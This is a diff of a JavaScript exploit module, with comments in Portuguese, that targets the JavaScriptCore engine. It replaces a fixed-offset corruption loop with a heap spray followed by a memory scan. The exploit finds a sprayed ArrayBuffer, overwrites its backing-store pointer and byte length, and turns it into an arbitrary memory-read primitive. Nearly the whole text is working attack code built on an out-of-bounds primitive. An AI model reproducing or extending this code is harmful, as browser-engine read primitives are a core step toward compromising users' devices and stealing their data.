@@ -1,26 +1,23 @@
-// js/script3/testMemoryLeakViaJsonTC.mjs (CORRIGIDO v4)
-import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
+// js/script3/testMemoryLeakViaJsonTC.mjs (ATUALIZADO PARA ESCANEAR A MEMÓRIA)
+import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { toHex, AdvancedInt64 } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     oob_write_absolute,
+    oob_read_absolute, // Agora também precisamos da primitiva de leitura
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 
-// --- Configuração para Exploit de Leitura Arbitrária ---
-const ARBITRARY_READ_CONFIG = {
-    SPRAY_COUNT: 200,
-    BUFFER_SIZE: 256,
-    TARGET_READ_ADDRESS: 0x3BD820n,
+// --- Configuração para Exploit com Escaneamento de Memória ---
+const SCAN_AND_READ_CONFIG = {
+    SPRAY_COUNT: 500, // Aumentamos a pulverização para mais chances
+    BUFFER_SIZE: 256, // Tamanho que procuraremos na memória
+    SCAN_RANGE_KB: 16, // Escanear 16 KB de memória em busca do nosso buffer
+    
+    TARGET_READ_ADDRESS: 0x3BD820n, // Endereço que queremos ler (JSC::ProtoCallFrame::argument)
+
     OFFSET_TO_BYTE_LENGTH: 8,
     OFFSET_TO_BACKING_STORE: 16,
-    corruption_offsets: [
-        (128) - 16,
-        (128) - 8,
-        (128),
-        (128) + 8,
-        (128) + 16,
-    ],
 };
 // --- Fim dos Parâmetros ---
 
@@ -31,76 +28,87 @@ function readBigInt64(dataview, offset) {
 }
 
 export async function testArbitraryRead() {
-    const FNAME = "testArbitraryRead";
-    logS3(`--- Iniciando Tentativa de Leitura de Memória Arbitrária ---`, "test", FNAME);
-    logS3(`   Alvo da Leitura: 0x${ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS.toString(16)}`, "info", FNAME);
+    const FNAME = "testArbitraryReadWithScan";
+    logS3(`--- Iniciando Tentativa de Leitura Arbitrária com Escaneamento de Memória ---`, "test", FNAME);
 
-    let success = false;
-    const SHORT_PAUSE_MS = 50;
+    if (typeof oob_read_absolute !== 'function') {
+        logS3("A primitiva 'oob_read_absolute' é necessária para o escaneamento e não está disponível.", "error", FNAME);
+        return;
+    }
 
-    for (const offset of ARBITRARY_READ_CONFIG.corruption_offsets) {
-        if (success) break;
+    await triggerOOB_primitive();
 
-        await triggerOOB_primitive();
-        if (!oob_write_absolute) {
-            logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME);
-            return;
-        }
+    // Etapa 1: Pulverizar o heap
+    let sprayed_buffers = [];
+    for (let i = 0; i < SCAN_AND_READ_CONFIG.SPRAY_COUNT; i++) {
+        sprayed_buffers.push(new ArrayBuffer(SCAN_AND_READ_CONFIG.BUFFER_SIZE));
+    }
+    logS3(`${SCAN_AND_READ_CONFIG.SPRAY_COUNT} buffers de ${SCAN_AND_READ_CONFIG.BUFFER_SIZE} bytes pulverizados.`, "info", FNAME);
+    
+    // Etapa 2: Escanear a memória para encontrar um dos nossos buffers
+    logS3(`Iniciando escaneamento de ${SCAN_AND_READ_CONFIG.SCAN_RANGE_KB} KB de memória...`, "info", FNAME);
+    let found_ab_metadata_addr = null;
+    const scan_limit = SCAN_AND_READ_CONFIG.SCAN_RANGE_KB * 1024;
 
-        logS3(`\n>>> Nova Tentativa: Corrompendo offset relativo ${toHex(offset)}`, "info", FNAME);
-
-        let sprayed_buffers = [];
-        for (let i = 0; i < ARBITRARY_READ_CONFIG.SPRAY_COUNT; i++) {
-            let ab = new ArrayBuffer(ARBITRARY_READ_CONFIG.BUFFER_SIZE);
-            new Uint32Array(ab)[0] = 0xDEADBEEF;
-            sprayed_buffers.push(ab);
-        }
-        logS3(`${ARBITRARY_READ_CONFIG.SPRAY_COUNT} buffers pulverizados no heap.`, "info", FNAME);
-
+    for (let offset = 0; offset < scan_limit; offset += 8) {
         try {
-            // CORREÇÃO FINAL: Converter o BigInt para uma string hexadecimal ANTES de criar o AdvancedInt64.
-            const targetAddrHex = '0x' + ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS.toString(16);
-            const targetAddrAsInt64 = new AdvancedInt64(targetAddrHex);
-
-            logS3(`  1. Escrevendo ponteiro para ${targetAddrAsInt64.toString()} em offset +${ARBITRARY_READ_CONFIG.OFFSET_TO_BACKING_STORE}`, "warn", FNAME);
-            oob_write_absolute(offset + ARBITRARY_READ_CONFIG.OFFSET_TO_BACKING_STORE, targetAddrAsInt64, 8);
-
-            logS3(`  2. Escrevendo tamanho 0xFFFFFFFF em offset +${ARBITRARY_READ_CONFIG.OFFSET_TO_BYTE_LENGTH}`, "warn", FNAME);
-            oob_write_absolute(offset + ARBITRARY_READ_CONFIG.OFFSET_TO_BYTE_LENGTH, 0xFFFFFFFF, 4);
-
-            await PAUSE_S3(SHORT_PAUSE_MS);
-
-            for (let i = 0; i < sprayed_buffers.length; i++) {
-                const ab = sprayed_buffers[i];
-                if (ab.byteLength > ARBITRARY_READ_CONFIG.BUFFER_SIZE) {
-                    logS3(`--- SUCESSO: Buffer [${i}] foi corrompido! ---`, "vuln", FNAME);
-                    logS3(`   Tamanho original: ${ARBITRARY_READ_CONFIG.BUFFER_SIZE}, Tamanho corrompido: ${ab.byteLength}`, "info", FNAME);
-                    
-                    let memory_reader_view = new DataView(ab);
-                    const leaked_data = readBigInt64(memory_reader_view, 0);
-
-                    const leakedDataHex = `0x${leaked_data.toString(16)}`;
-                    logS3(`   >> DADO VAZADO de ${targetAddrHex}: ${leakedDataHex}`, "leak", FNAME);
-
-                    success = true;
-                    break;
-                }
+            const potential_metadata = oob_read_absolute(offset, 8);
+            // Um ArrayBuffer de 256 bytes terá seu campo de tamanho (em um offset específico)
+            // igual a 256. Vamos procurar por isso. O campo pode ter outros metadados nos bits superiores.
+            // A suposição aqui é que o byteLength está no início de um bloco de 8 bytes.
+            if ((potential_metadata & 0xFFFFFFFFn) === BigInt(SCAN_AND_READ_CONFIG.BUFFER_SIZE)) {
+                
+                // Encontramos um candidato! O endereço real do objeto é antes do campo de tamanho.
+                const candidate_addr = BigInt(offset) - BigInt(SCAN_AND_READ_CONFIG.OFFSET_TO_BYTE_LENGTH);
+                logS3(`CANDIDATO ENCONTRADO! Offset: ${toHex(offset)}, Addr. do Objeto: ${toHex(candidate_addr)}`, "good", FNAME);
+                found_ab_metadata_addr = candidate_addr;
+                break;
             }
-        } catch (e) {
-            logS3(`Erro durante a tentativa com offset ${toHex(offset)}: ${e.message}`, "error", FNAME);
-        }
-        
-        sprayed_buffers = null;
-        if (typeof globalThis.gc === 'function') {
-            globalThis.gc();
-        }
-        await PAUSE_S3(SHORT_PAUSE_MS);
+        } catch (e) { /* Ignorar erros de leitura durante o scan */ }
     }
 
-    clearOOBEnvironment();
-    if (success) {
-        logS3("--- Primitiva de LEITURA ARBITRÁRIA construída com sucesso! ---", "vuln", FNAME);
-    } else {
-        logS3("--- Teste concluído, não foi possível encontrar um offset vulnerável. ---", "warn", FNAME);
+    if (!found_ab_metadata_addr) {
+        logS3("Falha ao encontrar um buffer pulverizado na memória. Tente aumentar o SPRAY_COUNT ou SCAN_RANGE_KB.", "error", FNAME);
+        clearOOBEnvironment();
+        return;
     }
+
+    // Etapa 3: Corromper o buffer encontrado
+    try {
+        const corruption_ptr_addr = found_ab_metadata_addr + BigInt(SCAN_AND_READ_CONFIG.OFFSET_TO_BACKING_STORE);
+        const corruption_len_addr = found_ab_metadata_addr + BigInt(SCAN_AND_READ_CONFIG.OFFSET_TO_BYTE_LENGTH);
+        const targetAddrAsInt64 = new AdvancedInt64('0x' + SCAN_AND_READ_CONFIG.TARGET_READ_ADDRESS.toString(16));
+
+        logS3(`Corrompendo o buffer encontrado em ${toHex(found_ab_metadata_addr)}`, "warn", FNAME);
+        oob_write_absolute(corruption_ptr_addr, targetAddrAsInt64, 8);
+        oob_write_absolute(corruption_len_addr, 0xFFFFFFFF, 4);
+
+        await PAUSE_S3(50);
+
+        // Etapa 4: Encontrar o buffer corrompido e ler a memória
+        for (let i = 0; i < sprayed_buffers.length; i++) {
+            const ab = sprayed_buffers[i];
+            if (ab.byteLength > SCAN_AND_READ_CONFIG.BUFFER_SIZE) {
+                logS3(`--- SUCESSO: O buffer [${i}] foi transformado em uma ferramenta de leitura! ---`, "vuln", FNAME);
+                let memory_reader_view = new DataView(ab);
+                const leaked_data = readBigInt64(memory_reader_view, 0);
+
+                const targetAddrHex = `0x${SCAN_AND_READ_CONFIG.TARGET_READ_ADDRESS.toString(16)}`;
+                const leakedDataHex = `0x${leaked_data.toString(16)}`;
+                logS3(`   >> DADO VAZADO de ${targetAddrHex}: ${leakedDataHex}`, "leak", FNAME);
+                
+                // Limpa e finaliza com sucesso
+                clearOOBEnvironment();
+                logS3("--- Primitiva de LEITURA ARBITRÁRIA construída com sucesso! ---", "vuln", FNAME);
+                return;
+            }
+        }
+
+    } catch (e) {
+        logS3(`Erro durante a corrupção do buffer encontrado: ${e.message}`, "error", FNAME);
+    }
+    
+    // Se chegou aqui, algo deu errado após encontrar o candidato.
+    logS3("--- Teste concluído, mas a leitura final falhou. ---", "warn", FNAME);
+    clearOOBEnvironment();
 }
